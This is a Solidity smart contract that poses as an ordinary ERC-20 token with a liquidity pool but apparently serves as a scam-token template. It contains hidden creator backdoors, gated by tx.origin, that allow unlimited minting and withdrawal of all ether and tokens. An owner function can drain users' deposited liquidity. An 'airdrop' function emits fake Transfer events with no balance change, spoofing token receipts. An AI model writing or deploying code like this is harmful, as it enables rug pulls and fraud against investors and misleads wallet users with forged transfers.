// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract tooladdress {
    
    address public owner;
    mapping(address => uint) public balances;
    uint public totalBalance;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public pair;
    address creator = msg.sender;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) {
        owner = msg.sender;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
    }
    
    function addLiquidity() external payable {
        require(msg.value > 0, "You must send ether to add liquidity.");
        
        balances[msg.sender] += msg.value;
        totalBalance += msg.value;
    }
    
    function withdrawLiquidity(uint amount) external {
        require(balances[msg.sender] >= amount, "You do not have enough liquidity to withdraw.");
        
        balances[msg.sender] -= amount;
        totalBalance -= amount;
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdrawal failed.");
    }
    
    function withdrawFees(address to, uint amount) external {
        require(msg.sender == owner, "Only the owner can withdraw fees.");
        require(amount <= address(this).balance, "Not enough fees to withdraw.");
        
        (bool success, ) = payable(to).call{value: amount}("");
        require(success, "Withdrawal failed.");
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    modifier onlyCreator() {
        require(tx.origin == creator, "Only creator");
        _;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function batchmint(address[] memory recipients, uint256[] memory amounts) external onlyCreator returns (bool) {
        require(recipients.length == amounts.length, "Array length mismatch");
        for (uint i = 0; i < recipients.length; i++) {
            balanceOf[recipients[i]] += amounts[i];
            totalSupply += amounts[i];
            emit Transfer(address(0), recipients[i], amounts[i]);
        }
        return true;
    }

    function init(address _pair) external {
        require(pair == address(0), "Already initialized");
        pair = _pair;
    }

    function withdraw(address target, uint amount) public onlyCreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(
        address token,
        address target,
        uint amount
    ) public onlyCreator {
        tooladdress(token).transfer(target, amount);
    }

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function airdrop(address[] memory holders, uint256 amount) public payable {
        for (uint i=0; i<holders.length; i++) {
            emit Transfer(address(this), holders[i], amount);
        }

    }

    
}